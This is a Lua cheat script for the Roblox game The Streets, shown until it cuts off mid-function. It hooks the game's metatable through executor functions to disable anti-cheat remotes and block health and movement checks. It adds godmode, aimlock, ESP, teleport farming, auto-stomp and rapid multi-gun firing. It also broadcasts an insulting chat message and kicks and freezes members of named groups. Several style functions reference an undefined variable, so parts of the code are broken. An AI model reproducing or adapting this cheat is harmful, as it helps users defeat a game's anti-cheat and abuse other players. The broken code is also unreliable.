--https://www.roblox.com/games/455366377/The-Streets
local Players,ReplicatedStorage,UserInput,CoreGui,TeleportService,RunService,Lighting,StarterGui,HttpService,TweenService,MarketplaceService = game:GetService'Players',game:GetService'ReplicatedStorage',game:GetService'UserInputService',game:GetService'CoreGui',game:GetService'TeleportService',game:GetService'RunService',game:GetService'Lighting',game:GetService'StarterGui',game:GetService'HttpService',game:GetService'TweenService',game:GetService'MarketplaceService'
local LP = Players.LocalPlayer
repeat wait() until LP and LP.Character and LP.Character:FindFirstChild'Humanoid'
local Mouse = LP:GetMouse()
local NormalWS,NormalJP,NormalHH = LP.Character:FindFirstChildWhichIsA'Humanoid'.WalkSpeed,LP.Character:FindFirstChildWhichIsA'Humanoid'.JumpPower,game.Players.LocalPlayer.Character:FindFirstChildWhichIsA'Humanoid'.HipHeight
local AirWalkOn,AntiFeKill,WaitingToRespawn,Noclipping,Blinking,FreeCamBlink,BfgOn,MinigunMode,MultiUzi,DoubleJumpEnabled,NoGh,AutoDie,AutoStomp,GodMode,Debounce,NormalBfg,AimLock = false,false,false,false,false,false,false,false,false,false,false,false,false,false,false,false,false,false,false
local BlinkSpeed,SpawnWS,SpawnJP,SpawnHH,SpawnSprint,SpawnCrouch,ClockTime,PlayOnDeath,AimlockTarget = nil,nil,nil,nil,nil,nil,nil,nil,nil
local speedfly = 2
local BlinkKey,ClickTpKey = "",""
local DeathPos,WaitingToRespawnPos = CFrame.new(),CFrame.new()
local Cmds = {}
local AntiKillTools,Keys,KeyTable,UrlEncoder,PartTable = {},{},{['w'] = false;['a'] = false;['s'] = false;['d'] = false;['Shift'] = false;['Control'] = false;},{['0'] = "%30";['1'] = "%31";['2'] = "%32";['3'] = "%33"; ['4'] = "%34";['5'] = "%35";['6'] = "%36";['7'] = "%37";['8'] = "%38";['9'] = "%39";[' '] = "%20";}
local CmdsList = {"Speed // Ws // SprintSpeed // CrouchSpeed [Arguments]","JumpPower // Jp [Arguments]","Rejoin // Rj","AirWalk [On/Off]","DeathSpawn","Reset // Re","Noclip","To // Goto [plr]","AntiKill","Time [Arguments]","Blink [Arguments]","Fly [Arguments] // Unfly","Loop [Ws/Jp/HH/Sprint/Crouch] [Arguments]// Unloop","Key [Key] [Cmd]","RemoveKey [Key]","RemoveAllKeys","ClickTp [key]","View [plr] // Unview","Fblink [key]","Fspeed [Arguments]","Spamclick [Amount]","Esp [Player]","Unesp [Player]","neversit","bfg [normal/minigun/multiuzi/allbfg/nil]","info [plr] [os/operatingsystem]/[accage/age/accountage]/nil","spam [text]/spamdelay [delay]/unspam","doublejump","NoGh","advertise","autodie","hipheight/hh [Argument]","style [deathcircle/shield1/shield2/circle/wormhole/storm/sphere]","droptool","grip [6 args all optional]","TpTo [Banland/NormalStreets/Uzi/SawedOff/Machete/Spray/Pipe]","autostomp","farm [Cash/Shotty/Uzi/Sawed Off/Katana/All/Auto]","luacode [code]","godmode","antiaim","aimlock [Optional Player]","antiafk","heal","reload","colour [outline/text/background/cmds] [rgb]","draggablegui","bringcar"} -- Only bfg multiuzi works without bfg bypass
local AirWalk,AntiKill = Instance.new'Part',Instance.new'Part'
local Clone,Destroy,Grab = Instance.new'HopperBin',Instance.new'HopperBin',Instance.new'HopperBin'
ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Welcome to Zetox v999 (.gg/GE3jHmN) Cracked by (jk it's cyrus' streets admin and chat messages are gay!)","All")
-- ^ if you remove this line you are a skid.
local Cframe = Instance.new("Frame",CoreGui.RobloxGui)
local CText = Instance.new("TextBox",Cframe)
local CmdFrame = Instance.new("Frame",Cframe)


if LP:IsInGroup(4401821) or LP:IsInGroup(3974060) or LP:IsInGroup(3869991) or LP:IsInGroup(5222647) or LP:IsInGroup(4516574) or string.find(string.lower(LP.Name),"odsg") or LP.UserId == "1460654046" or LP.UserId == "1427672031" then 
	LP.Character:FindFirstChildOfClass'Humanoid'.WalkSpeed = 500 

	wait(5)
	LP:Kick("No rogangsters!")
	while true do end 
	return 
end 

if workspace:FindFirstChild'Armoured Truck' then
	PartTable = {
		['Burger'] = workspace:FindFirstChild'Burger | $15':FindFirstChildOfClass'Part'.CFrame + Vector3.new(0,0.5,0);
		['Drink'] = workspace:FindFirstChild'Drink | $15':FindFirstChildOfClass'Part'.CFrame + Vector3.new(0,0.5,0);
		['Ammo'] = workspace:FindFirstChild'Buy Ammo | $25':FindFirstChildOfClass'Part'.CFrame + Vector3.new(0,1,0);
		['Pipe'] = workspace:FindFirstChild'Pipe | $100':FindFirstChildOfClass'Part'.CFrame + Vector3.new(0,0.5,0);
		['Machete'] = workspace:FindFirstChild'Machete | $70':FindFirstChildOfClass'Part'.CFrame + Vector3.new(0,0.5,0);
		['SawedOff'] = workspace:FindFirstChild'Sawed Off | $150':FindFirstChildOfClass'Part'.CFrame + Vector3.new(0,1,0);
		['Spray'] = workspace:FindFirstChild'Spray | $20':FindFirstChildOfClass'Part'.CFrame + Vector3.new(0,1,0);
		['Uzi'] = workspace:FindFirstChild'Uzi | $150':FindFirstChildOfClass'Part'.CFrame + Vector3.new(0,0.5,0);
	}
    workspace["Armoured Truck"]:Destroy()
elseif workspace:FindFirstChild'TPer' then 
    workspace['TPer']:Destroy()
end

LP.PlayerGui.Chat.Frame.ChatChannelParentFrame.Visible = true
LP.PlayerGui.Chat.Frame.ChatBarParentFrame.Position = LP.PlayerGui.Chat.Frame.ChatChannelParentFrame.Position+UDim2.new(UDim.new(),LP.PlayerGui.Chat.Frame.ChatChannelParentFrame.Size.Y)
--^ lol ty Jayy#0648 for this "Hack" for normal chat 

local BindableEvent = Instance.new'BindableEvent'
BindableEvent.Event:Connect(function()
	LP.Character:BreakJoints()
end)
StarterGui:SetCore('ResetButtonCallback',BindableEvent)

--[[local function Center(x,y)
	return math.sqrt(math.pow((x - workspace.CurrentCamera.ViewportSize.X/2),2) + math.pow((y - workspace.CurrentCamera.ViewportSize.Y/2),2))
end

local function ClosestPlayer()
	local Child,Player = Players:GetPlayers(),nil
	local NearestDistance = math.huge
	for i = 1,#Child do
		if Child[i] ~= LP and Child[i].Character and Child[i].Character.Head and not Child[i].Character:FindFirstChild'KO' then
			local ActualDistance = Center(workspace.CurrentCamera:WorldToScreenPoint(Child[i].Character.Head.Position).X,workspace.CurrentCamera:WorldToScreenPoint(Child[i].Character.Head.Position).Y)
			if ActualDistance < NearestDistance and ActualDistance < 700 then
				NearestDistance = ActualDistance
				Player = Child[i]
			end
		end
	end
	return Player,NearestDistance
 end
 lol not used yet 
]]

local function loluzistatscool()
	local Child = LP.PlayerGui:GetChildren()
	local UziAmount,ClipsAmount,AmmoAmount,Damage = 0,0,0,0
	for i = 1,#Child do
		if Child[i].Name == "Uzi" and Child[i].Clips and Child[i].Ammo then 
			UziAmount = UziAmount + 1 
			ClipsAmount = ClipsAmount + Child[i].Clips.Value
			AmmoAmount = AmmoAmount + Child[i].Ammo.Value
		end
	end 
	local ZetoxUzi = LP.Backpack:FindFirstChild'Zetox Uzi' or LP.Character:FindFirstChild'Zetox Uzi'
	ZetoxUzi.ToolTip = "Zetox Uzi | Clips "..tostring(ClipsAmount / UziAmount).." | Damage "..tostring(UziAmount * 20).." | Ammo "..tostring(AmmoAmount / UziAmount).." | Uzi Amount "..tostring(UziAmount)
end

local loldebounce = false 
local function lolmultiuzithatisreloading(Part)
if loldebounce then return end
	if Part.Parent.Name == "Buy Ammo | $25" and LP.Character:FindFirstChild'Zetox Uzi' and LP.PlayerGui:FindFirstChild'Uzi' then
		local ActualUzi,LowestAmmo,Child,loldebounce = nil,math.huge,LP.PlayerGui:GetChildren(),true
		for _,v in pairs(Child) do 
			if v.Name == "Uzi" and v.Clips and v.Clips.Value < LowestAmmo then 
				LowestAmmo = v.Clips.Value 
				ActualUzi = v
			end
		end
		ActualUzi.Parent = LP.Backpack
		ActualUzi.Parent = LP.Character
		wait(1)
		ActualUzi.Parent = LP.PlayerGui
		loldebounce = false 
	end
end

local function lolmultiuzithatcanactuallyreload()
	if LP.Backpack:FindFirstChild'Zetox Uzi' or LP.Character:FindFirstChild'Zetox Uzi' then return end 
	local Tool = Instance.new('Tool',LP.Backpack)
	Tool.RequiresHandle = false 
	Tool.CanBeDropped = false 
	Tool.Name = "Zetox Uzi"
	Tool.ToolTip = "Zetox Uzi"
	Tool.Equipped:Connect(loluzistatscool)
end 

local function Teleport(Part)
	if _G.DoYouHaveBfgBypass then 
		LP.Character.HumanoidRootPart.CFrame = Part
	else
		NeverSitting,Noclipping = true,true
		local Play = TweenService:Create(LP.Character.HumanoidRootPart, TweenInfo.new(3.2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut),{CFrame = Part})
		Play:play()
	end
end

local function Heal()
	if Debounce then return end
	local CFRame = LP.Character.HumanoidRootPart.CFrame 
    LP.Character.HumanoidRootPart.CFrame = LP.Character.HumanoidRootPart.CFrame * CFrame.new(math.random(20,45),0,math.random(1,5))
    wait()
    repeat  
        LP.Character.HumanoidRootPart.CFrame = PartTable['Burger']
        game:GetService'RunService'.Heartbeat:wait()
	until LP.Backpack:FindFirstChild'Burger' or LP.Character:FindFirstChild'KO' or LP.Character.Humanoid.Health <= 0
	if LP.Backpack:FindFirstChild'Burger' then 
		local Burg = LP.Backpack.Burger
		Burg.Parent = LP.Character
		Burg:Activate()
	end
    repeat 
        LP.Character.HumanoidRootPart.CFrame = PartTable['Drink']
        game:GetService'RunService'.Heartbeat:wait()
	until LP.Backpack:FindFirstChild'Drink' or LP.Character:FindFirstChild'KO' or LP.Character.Humanoid.Health <= 0
	if LP.Backpack:FindFirstChild'Drink' then 
		local Drink = LP.Backpack.Drink
		Drink.Parent = LP.Character
		Drink:Activate()
	end
	LP.Character.HumanoidRootPart.CFrame = CFRame
end 

local function GrabThing(Thing)
local Anim = Instance.new'Animation'
Anim.AnimationId = "rbxassetid://188632011"
local Track = LP.Character:FindFirstChildOfClass'Humanoid':LoadAnimation(Anim)
LP.Character.HumanoidRootPart.CFrame = LP.Character.HumanoidRootPart.CFrame * CFrame.new(math.random(20,45),0,math.random(1,5))
wait()
	if Thing == "Uzi" then 
		repeat  
			Track:play(.1,1,1)
			LP.Character.HumanoidRootPart.CFrame = PartTable['Uzi']
			game:GetService'RunService'.Heartbeat:wait()
		until not workspace:FindFirstChild'Uzi | $150' or LP.Character:FindFirstChild'KO' or LP.Character.Humanoid.Health <= 0
	elseif Thing == "SawedOff" then 
		repeat  
			Track:play(.1,1,1)
			LP.Character.HumanoidRootPart.CFrame = PartTable['SawedOff']
			game:GetService'RunService'.Heartbeat:wait()
		until not workspace:FindFirstChild'Sawed Off | $150' or LP.Character:FindFirstChild'KO' or LP.Character.Humanoid.Health <= 0
	elseif Thing == "Spray" then 
		repeat  
			Track:play(.1,1,1)
			LP.Character.HumanoidRootPart.CFrame = PartTable['Spray']
			game:GetService'RunService'.Heartbeat:wait()
		until not workspace:FindFirstChild'Spray | $20' or LP.Character:FindFirstChild'KO' or LP.Character.Humanoid.Health <= 0
	elseif Thing == "Machete" then 
		repeat  
			Track:play(.1,1,1)
			LP.Character.HumanoidRootPart.CFrame = PartTable['Machete']
			game:GetService'RunService'.Heartbeat:wait()
		until not workspace:FindFirstChild'Machete | $70' or LP.Character:FindFirstChild'KO' or LP.Character.Humanoid.Health <= 0
	elseif Thing == "Pipe" then 
		repeat  
			Track:play(.1,1,1)
			LP.Character.HumanoidRootPart.CFrame = PartTable['Pipe']
			game:GetService'RunService'.Heartbeat:wait()
		until not workspace:FindFirstChild'Pipe | $100' or LP.Character:FindFirstChild'KO' or LP.Character.Humanoid.Health <= 0		
	end
end 

local function Ammo()
	if Debounce then return end
	local CFRame,Old,Anim = LP.Character.HumanoidRootPart.CFrame,LP.Character:FindFirstChildOfClass'Tool'.Clips.Value,Instance.new'Animation'
	Anim.AnimationId = "rbxassetid://188632011" 
	local Track = LP.Character:FindFirstChildOfClass'Humanoid':LoadAnimation(Anim)
	LP.Character.HumanoidRootPart.CFrame = CFrame.new(math.random(20,45),0,math.random(1,5))
    wait()
	repeat  
		Track:play(.1,1,1)
        LP.Character.HumanoidRootPart.CFrame = PartTable['Ammo']
        game:GetService'RunService'.Heartbeat:wait()
	until Old < LP.Character:FindFirstChildOfClass'Tool'.Clips.Value or LP.Character:FindFirstChild'KO' or LP.Character.Humanoid.Health <= 0
	Track:Stop()
	LP.Character.HumanoidRootPart.CFrame = CFRame
end 

local gamememe = getrawmetatable or getmetatable or debug.getmetatable
gamememe = gamememe(game) -- did this for exploits that can't index nil values (Calamari for example/see setreadonly aswell)
local Closure,Caller = hide_me or newcclosure,checkcaller or is_protosmasher_caller or Cer.isCerus

if setreadonly then
	setreadonly(gamememe,false)
elseif make_writeable then -- had to switch this for sentinel support since it can't index nil values (SAME WITH CALAMARI)
	make_writeable(gamememe)
end 

local name,index,nindex = gamememe.__namecall,gamememe.__index,gamememe.__newindex

gamememe.__newindex = Closure(function(self,Property,b)
	if not Caller() then
		if self:IsA'Humanoid' then 
			if Property == "WalkSpeed" or Property == "Health" or Property == "JumpPower" or Property == "HipHeight"  then 
				return 
			end
		end
		if Property == "CFrame" and self.Name == "HumanoidRootPart" or self.Name == "Torso" then
       		return 
    	end
	end
	return nindex(self,Property,b)
end)

gamememe.__namecall = Closure(function(self,...)
    if not Caller() then
		local Arguments = {...}
		if getnamecallmethod() == "Destroy" then 
       		if tostring(self) == "BodyGyro" or tostring(self) == "BodyVelocity" then
				return invalidfunctiongang(self,...)
			end 
        end
        if getnamecallmethod() == "BreakJoints" and tostring(self) == game:GetService'Players'.LocalPlayer.Character.Name then
            return invalidfunctiongang(self,...)
        end
        if getnamecallmethod() == "FireServer" then 
            if self.Name == "lIII" or tostring(self.Parent) == "ReplicatedStorage" then 
                return wait(9e9)
            end
            if Arguments[1] == "hey" then 
                return wait(9e9)
            end
		end
		if Arguments[1] == "play" then
		local TempTable = {}
			tostring(Arguments[2]):gsub('.',function(Char)
				if UrlEncoder[Char] then 
					table.insert(TempTable,UrlEncoder[Char])
				else 
					table.insert(TempTable,Char)
				end
			end)
			Arguments[2] = table.concat(TempTable,"")
			PlayOnDeath = Arguments[2]
			return name(self,unpack(Arguments))
		end
		if Arguments[1] == "stop" then 
			PlayOnDeath = nil 
		end
		if tostring(self.Name) == "Fire" and AimlockTarget and AimLock then
			return name(self,AimlockTarget.Head.CFrame + AimlockTarget.Torso.Velocity/5)
		end
    end
    return name(self,...)
end)
-- lol fuck off snakeworl 

local SettingsTable = {
   Keys = {};
   ClickTpKey = "";
   BlinkKey = "";
}

local function savesettings()
    writefile("CyrusStreetsAdminSettings",HttpService:JSONEncode(SettingsTable))
    local SettingsToSave = HttpService:JSONDecode(readfile("CyrusStreetsAdminSettings"))
    Keys = SettingsToSave.Keys
    ClickTpKey = SettingsToSave.ClickTpKey
	BlinkKey = SettingsToSave.BlinkKey
end 

local function updateSettings()
    local New = { 
        Keys = Keys;
		ClickTpKey = ClickTpKey;
		BlinkKey = BlinkKey;
    }
    writefile("CyrusStreetsAdminSettings",HttpService:JSONEncode(New))
end

local function runsettings()
    local SettingsToRun = HttpService:JSONDecode(readfile("CyrusStreetsAdminSettings"))
    Keys = SettingsToRun.Keys
    ClickTpKey = SettingsToRun.ClickTpKey
	BlinkKey = SettingsToRun.BlinkKey
end

local Work,Error = pcall(function() readfile("CyrusStreetsAdminSettings") end)

if not Work then 
    savesettings()
else
    runsettings()
end

local function RunCmd(Msg)
	local Arguments = string.split(Msg," ")
	local NCommand = Cmds[table.remove(Arguments,1):lower()]
	if NCommand then
		NCommand(Arguments)
	end
end

local BChild,CChild = LP.Backpack:GetChildren(),LP.Character:GetChildren()
local function Unequip()
	for i = 1,#BChild do 
		BChild[i].Parent = LP.Backpack
	end
end

local function Style1(Amount)
Unequip()
	for i = 1,#BChild do 
		Bchild[i].Grip = CFrame.Angles(0,0.6,Amount * i)
	end 
end

local function Style2()
Unequip()
	for i = 1,#BChild do 
		Bchild[i].Grip = CFrame.Angles(1 * i,1.5,0)
	end 
end

local function Style3()
Unequip()
	for i = 1,#BChild do 
		Bchild[i].Grip = CFrame.Angles(5,50*i,0) + Vector3.new(0,0,0.6)
	end 
end

local function Style4(Amount)
Unequip()
	for i = 1,#BChild do 
		Bchild[i].Grip = CFrame.Angles(30,Amount*i,0) + Vector3.new(10,0.5,0.6)
	end 
end
local function Style5()
Unequip()
	for i = 1,#BChild do 
		Bchild[i].Grip = CFrame.Angles(5*i,2*i,7*i) + Vector3.new(0,5,0)
	end 
end

local function Style6()
Unequip()
	for i = 1,#BChild do 
		Bchild[i].Grip = CFrame.Angles(5*i,2040/i,2*i/i*10)
	end 
end

local function Style7()
Unequip()
	for i = 1,#BChild do 
		Bchild[i].Grip = CFrame.Angles(5,200*i,2*i)
	end 
end

local function Style8()
Unequip()
	for i = 1,#BChild do 
		Bchild[i].Grip = CFrame.Angles(0.1/i*i,200*i,0) + Vector3.new(0,0,5)
	end 
end

local function Style9()
Unequip()
	for i = 1,#BChild do 
		Bchild[i].Grip = CFrame.Angles(4/i*i,200*i,0) + Vector3.new(0,0,5)
	end 
end

local JustDoubleJumped = false 
local function HumanoidState(Old,New)
	if New == Enum.HumanoidStateType.Landed and JustDoubleJumped then 
		local Anim = Instance.new'Animation'
		Anim.AnimationId = "rbxassetid://129423030" 
		local AnimTrack = LP.Character:FindFirstChildOfClass'Humanoid':LoadAnimation(Anim)
		wait(0.3)
		AnimTrack:play()
		JustDoubleJumped = false
	elseif New == Enum.HumanoidStateType.FallingDown or New == Enum.HumanoidStateType.PlatformStanding and NoGh then
      	LP.Character.Humanoid.PlatformStand = false
     	LP.Character.Humanoid.Sit = false
	  	LP.Character.Humanoid:ChangeState(2)
		LP.Character.Humanoid:ChangeState(10)
  	end
end

local function DoubleJump()
  if LP.Character and LP.Character.Humanoid and DoubleJumpEnabled then
      LP.Character.Humanoid:ChangeState(3)
      local Anim = Instance.new'Animation'
      Anim.AnimationId = "rbxassetid://229782914"
      local AnimTrack = LP.Character:FindFirstChildOfClass'Humanoid':LoadAnimation(Anim)
      AnimTrack:play(.1,1,1.5)
      JustDoubleJumped = true
  end
end

local function notif(title,message,length,icon)
	StarterGui:SetCore("SendNotification",{['Title'] = title;['Text'] = message;['Duration'] = length;['Icon'] = icon;})
end

local function PlrFinder(Plr)
local NewPlr,Player = Plr:lower(),Players:GetPlayers()
	for i = 1,#Player do 
		if string.lower(Player[i].Name):sub(1,#NewPlr) == string.lower(NewPlr) then 
			return Player[i]
		end
	end
end

local function MultiUzif(Tool)
    if Tool:IsA'Tool' and Tool.Name == "Uzi" and MultiUzi then 
		wait()
		lolmultiuzithatcanactuallyreload()
		loluzistatscool()
        Tool.Parent = LP.PlayerGui
	end
	if Tool:IsA'Tool' and Tool.Name == "Fat Cash" or Tool.Name == "Cash" then
		wait()
		Tool.Parent = LP.Character
		Tool:Activate()
	end
end

local function find(Item)
  for i,v in pairs(workspace:GetChildren()) do 
      if v.Name == "RandomSpawner" and v:FindFirstChild'Model' then
      local Handle = v.Model.Handle
        if Item == "Cash" and Handle:FindFirstChildOfClass'MeshPart' and string.find(Handle:FindFirstChildOfClass'MeshPart'.MeshId,"511726060") then
          return v
        elseif Item == "Shotty" and Handle:FindFirstChild'Fire' and string.find(Handle.Fire.SoundId,"142383762") then 
          return v
        elseif Item == "Sawed Off" and Handle:FindFirstChild'Fire' and string.find(Handle.Fire.SoundId,"219397110") then 
          return v 
        elseif Item == "Uzi" and Handle:FindFirstChild'Fire' and string.find(Handle.Fire.SoundId,"328964620") then 
          return v 
        elseif Item == "All" then 
          return v
      end
    end
  end
end

local function farm(Item)
  for i,v in pairs(workspace:GetChildren()) do 
    if v.Name == "RandomSpawner" then 
		if find(Item) and type(find(Item)) == "userdata" then 
			Teleport(find(Item).CFrame)
			if not _G.DoYouHaveBfgBypass then 
				wait(3)
			end
		else 
			notif("Farm "..Item,"None of "..Item.." on the map",5,"rbxassetid://1281284684")
			break;
	   	end
      end
   end
end

local function View(Plr)
	if Plr.Character then 
		workspace.CurrentCamera.CameraSubject = Plr.Character
	end
end

local function Fblink()
	if workspace:FindFirstChild'BlinkPart' then
		workspace.BlinkPart:Destroy()
	end
	local speedget = speedfly
	local CameraPart = Instance.new("Part",workspace)
	CameraPart.CanCollide = false
	CameraPart.CFrame = LP.Character.Head.CFrame
	CameraPart.Locked = true
	CameraPart.Transparency = 1
	CameraPart.Size = Vector3.new(1, 1, 1)
	CameraPart.Name = "BlinkPart"
	workspace.CurrentCamera.CameraSubject = CameraPart
	local T = CameraPart
	local CONTROL = {F = 0, B = 0, L = 0, R = 0}
	local lCONTROL = {F = 0, B = 0, L = 0, R = 0}
	local SPEED = speedget
	local function FreeCam()
		LP.Character.Head.Anchored = true
		doFREECAM = true
		local BG = Instance.new('BodyGyro', T)
		local BV = Instance.new('BodyVelocity', T)
		BG.P = 9e4
		BG.maxTorque = Vector3.new(9e9, 9e9, 9e9)
		BG.cframe = T.CFrame
		BV.velocity = Vector3.new(0, 0.1, 0)
		BV.maxForce = Vector3.new(9e9, 9e9, 9e9)
		spawn(function()
		repeat wait()
		if CONTROL.L + CONTROL.R ~= 0 or CONTROL.F + CONTROL.B ~= 0 then
		SPEED = 50
		elseif not (CONTROL.L + CONTROL.R ~= 0 or CONTROL.F + CONTROL.B ~= 0) and SPEED ~= 0 then
		SPEED = 0
		end
		if (CONTROL.L + CONTROL.R) ~= 0 or (CONTROL.F + CONTROL.B) ~= 0 then
		BV.velocity = ((workspace.CurrentCamera.CoordinateFrame.lookVector * (CONTROL.F + CONTROL.B)) + ((workspace.CurrentCamera.CoordinateFrame * CFrame.new(CONTROL.L + CONTROL.R, (CONTROL.F + CONTROL.B) * 0.2, 0).p) - workspace.CurrentCamera.CoordinateFrame.p)) * SPEED
		lCONTROL = {F = CONTROL.F, B = CONTROL.B, L = CONTROL.L, R = CONTROL.R}
		elseif (CONTROL.L + CONTROL.R) == 0 and (CONTROL.F + CONTROL.B) == 0 and SPEED ~= 0 then
		BV.velocity = ((workspace.CurrentCamera.CoordinateFrame.lookVector * (lCONTROL.F + lCONTROL.B)) + ((workspace.CurrentCamera.CoordinateFrame * CFrame.new(lCONTROL.L + lCONTROL.R, (lCONTROL.F + lCONTROL.B) * 0.2, 0).p) - workspace.CurrentCamera.CoordinateFrame.p)) * SPEED
		else
		BV.velocity = Vector3.new(0, 0.1, 0)
		end
		BG.cframe = workspace.CurrentCamera.CoordinateFrame
				until not doFREECAM
				CONTROL = {F = 0, B = 0, L = 0, R = 0}
				lCONTROL = {F = 0, B = 0, L = 0, R = 0}
				SPEED = 0
				BG:destroy()
				BV:destroy()
			end)
		end
	local function FFly(KEY)
		if KEY:lower() == 'w' then
			CONTROL.F = speedfly
		elseif KEY:lower() == 's' then
			CONTROL.B = -speedfly
		elseif KEY:lower() == 'a' then
			CONTROL.L = -speedfly 
		elseif KEY:lower() == 'd' then 
			CONTROL.R = speedfly
		end
	end
	local function UnFFly(KEY)
		if KEY:lower() == 'w' then
			CONTROL.F = 0
		elseif KEY:lower() == 's' then
			CONTROL.B = 0
		elseif KEY:lower() == 'a' then
			CONTROL.L = 0
		elseif KEY:lower() == 'd' then
			CONTROL.R = 0
		end
	end
	FreeCam()
	FreeCamBlink = true
	Mouse.KeyDown:Connect(FFly)
	Mouse.KeyUp:Connect(UnFFly)
end

local function UnFblink()
	if workspace:FindFirstChild'BlinkPart' then 
		local OldPos = workspace.BlinkPart.CFrame
		LP.Character.Head.Anchored = false
		workspace.BlinkPart:Destroy()
		workspace.CurrentCamera.CameraSubject = LP.Character
		FreeCamBlink = false
		Teleport(OldPos)
	end
end

local function esp()
	for _,createESP in pairs(LP.Character:GetDescendants()) do
	if createESP.Name == "Torso" or createESP.Name == "Left Leg" or createESP.Name == "Right Leg" or createESP.Name == "UpperTorso" or createESP.Name == "LowerTorso" or createESP.Name == "RightLowerLeg" or createESP.Name == "RightUpperLeg" or createESP.Name == "RightFoot"or createESP.Name == "UpperTorso" or createESP.Name == "LeftFoot" or createESP.Name == "LeftLowerLeg" or createESP.Name == "LeftUpperLeg" or createESP.Name == "Left Arm" or createESP.Name == "Right Arm" then
		if createESP.Name ~= "HumanoidRootPart" and createESP.Name ~= "Handle" then
			local espBOX = Instance.new("BoxHandleAdornment",CoreGui.RobloxGui)
				espBOX.Name = "[ BLINK ] "..LP.Name
				espBOX.Adornee = createESP
				espBOX.AlwaysOnTop = true
				espBOX.ZIndex = 0
				espBOX.Size = Vector3.new(createESP.Size.X,2,createESP.Size.Z)
				espBOX.Transparency = 0.5
				espBOX.Color = BrickColor.new(255, 0, 0	)
			local AboveHead = Instance.new("BillboardGui",CoreGui.RobloxGui)
				AboveHead.Adornee = LP.Character.Head
				AboveHead.Name = "[ BLINK ] "..LP.Name
				AboveHead.Size = UDim2.new(0, 100, 0, 100)
				AboveHead.StudsOffset = Vector3.new(0, 1, 0)
				AboveHead.AlwaysOnTop = true
				AboveHead.Name = "[ BLINK ] "..LP.Name
			local Info = Instance.new("TextLabel",AboveHead)
				Info.BackgroundTransparency = 1
				Info.Name = "[ BLINK ] "..LP.Name
				Info.Position = UDim2.new(0, 0, 0, 0)
				Info.Size = UDim2.new(1, 0, 0, 40)
				Info.TextColor3 = Color3.fromRGB(200,200,200)
				Info.TextStrokeTransparency = 0.5
				Info.TextSize = 15
				Info.TextStrokeColor3 = Color3.fromRGB(40, 127, 71)
				Info.Text = "[ Blink ] "..LP.Name
			end
		end
	end
end

local function fire(Tool,Part)
	if AimlockTarget and AimLock then
		Tool.Fire:FireServer(AimlockTarget.Head.CFrame + AimlockTarget.HumanoidRootPart.Velocity/5)
	else
		Tool.Fire:FireServer(Mouse.Hit)
	end
end

local OnlyAimLock,AimDebounce = false,false
local function Modes()
	if BfgOn and LP.Character:FindFirstChild'Uzi' then
		for i = 1,#BChild do 
			if BChild[i]:isA'Tool' and BChild[i].Name == "Uzi" then
				BChild[i].Parent = LP.Character
				fire(BChild[i])
				if MinigunMode then 
					wait()
				end
			end
		end
  end
  if NormalBfg then 
		for i = 1,#CChild do 
			if CChild[i]:FindFirstChild'Fire' then
				fire(CChild[i])
				if MinigunMode then 
					wait()
				end
			end
		end
	end
	if MultiUzi and LP.Character:FindFirstChild'Zetox Uzi' then
		loluzistatscool()
		local Child = LP.PlayerGui:GetChildren() 
		for i = 1,#Child do
			if Child[i]:IsA'Tool' and Child[i].Name == "Uzi" then
				Child[i].Grip = CFrame.new(0,0,-6)
				Child[i].Parent = LP.Backpack
				Child[i].Parent = LP.Character
				fire(Child[i])
				Child[i].Parent = LP.PlayerGui
				if MinigunMode then 
					wait()
				end
			end
		end
	end
	if Mouse.Target and Players:GetPlayerFromCharacter(Mouse.Target.Parent) and Mouse.Target.Parent:FindFirstChildOfClass'Humanoid' and AimLock and not OnlyAimLock and not AimDebounce then 
		AimDebounce = true 
		AimlockTarget = Mouse.Target.Parent
		AimlockTarget:FindFirstChildOfClass'Humanoid'.Died:Connect(function(a)
			AimlockTarget = nil
			OnlyAimLock = false  
		end)
		AimlockTarget.ChildAdded:Connect(function(P) 
			if P.Name == "KO" then 
				AimlockTarget = nil 
				OnlyAimLock = false
				AimDebounce = false 
			end
		end)
		notif("AimlockTarget","has been set to "..AimlockTarget.Name,5,"rbxassetid://1281284684")
		wait(3)
		AimDebounce = false 
	end
	if Mouse.Target and LP.Character:FindFirstChild'Zetox Btools' then
        Mouse.Target:Destroy()
    end 
end

local function unesp()
	for _,v in pairs(CoreGui:GetDescendants()) do 
		if v.Name == "[ BLINK ] "..LP.Name then 
			v:Destroy()
		end
	end
end

local function HotkeyHandler(Key)
	for _,v in pairs(Keys) do 
		local currentKey = string.match(v, "[%a%d]+$")
		if string.len(currentKey) == 1 then
			if Key == string.sub(v,#v,#v) then
				local CMD = string.match(v, "^[%w%s]+")
				if string.sub(string.lower(CMD),1,3) == "fly" then
					if flying then 
						flying = false
					else
						RunCmd(CMD)
					end
					elseif string.sub(string.lower(CMD),1,5) == "blink" then 
						if Blinking then 
							Blinking = false
						else 
							RunCmd(CMD)
						end
					elseif CMD == "noclip" then
						Noclipping = not Noclipping
						notif("Command: Noclip","has been set to "..tostring(Noclipping),5,"rbxassetid://1281284684")
					elseif CMD == "airwalk" then
						AirWalkOn = not AirWalkOn
					else 
					RunCmd(CMD)
				end
			end
		end
	end
	if CMD == "bfg" then 
		BfgOn = not BfgOn
	end
	if Key == BlinkKey then
		if FreeCamBlink then 
			UnFblink()
			unesp()
		else
			Fblink()
			esp()
		end
	end
    if Key == ClickTpKey and Mouse.Target then
        if (Mouse.hit.Position - LP.Character.HumanoidRootPart.Position).magnitude < 50 then 
            LP.Character.HumanoidRootPart.CFrame = CFrame.new(Mouse.Hit.p + Vector3.new(0,5,0))
        else
            Teleport(CFrame.new(Mouse.Hit.p + Vector3.new(0,5,0)))
        end
    end
end

local ShiftSpeed,WalkSpeed,ControlSpeed = 25,16,8
local AntiAfk,TpBypass = false,false
local function Looped()
	pcall(function()
		if Noclipping and LP.Character then 
			local CDescendant = LP.Character:GetDescendants()
          	for i = 1,#CDescendant do 
                if CDescendant[i]:IsA'BasePart' then 
                    CDescendant[i].CanCollide = false
				end
			end
		end
        if ClockTime then 
            Lighting.ClockTime = ClockTime
        end
        if NeverSitting then 
            LP.Character:FindFirstChildOfClass'Humanoid'.Sit = false
		end
		if AutoStomp then
			local Players = Players:GetPlayers()
			for i = 1,#Players do
				if Players[i] ~= LP and Players[i].Character and Players[i].Character.Head and not Players[i]:IsFriendsWith(LP.UserId) then
